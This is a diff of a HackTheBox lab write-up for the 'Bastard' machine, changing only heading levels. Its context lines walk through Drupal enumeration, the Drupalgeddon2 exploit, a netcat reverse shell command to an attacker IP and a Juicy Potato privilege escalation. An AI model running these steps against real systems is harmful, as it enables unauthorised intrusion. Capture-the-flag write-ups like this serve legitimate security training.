@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/bastard
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Bastard](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -54,7 +54,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 We found three open ports, but the most important one is port 80 running IIS http web server.
 
-## Web
+### Web
 
 Let's navigate to the web page.
 
@@ -66,7 +66,7 @@ We found a login page of Drupal. To know the version running we can go to `/CHAN
 
 The version of Drupal running is `7.54`.
 
-## Searchsploit
+### Searchsploit
 
 Let's see if this version is vulnerable
 
@@ -93,7 +93,7 @@ Shellcodes: No Results
 
 This version is vulnerable to remote code execution.
 
-# **Foothold**
+## **Foothold**
 
 The exploit for this service is know as `Drupalgeddon2`, the one I'll be using can be found [here](https://github.com/dreadlocked/Drupalgeddon2).
 
@@ -148,7 +148,7 @@ nt authority\iusr
 
 It tried and failed multiple time but we got command execution at the end as `nt authority\iusr`
 
-## Reverse shell
+### Reverse shell
 
 To get a reverse shell we upload a copy of netcat to the target using the following command
 
@@ -164,9 +164,9 @@ nc.exe 10.10.10.10 9001 -e cmd.exe
 
 ![](3.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
-## Method 1: SeImpersonatePrivilege
+### Method 1: SeImpersonatePrivilege
 
 Let's check our privileges
 
@@ -187,7 +187,7 @@ SeCreateGlobalPrivilege Create global objects                     Enabled
 
 We have the `SeImpersonatePrivilege` privilege.
 
-### Juicy Potato
+#### Juicy Potato
 
 Let try Juicy Potato attack.
 
@@ -201,7 +201,7 @@ JuicyPotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\window
 
 We got System!
 
-## Method 2: Kernel
+### Method 2: Kernel
 
 Let's run windows exploit suggester and see what we get
 
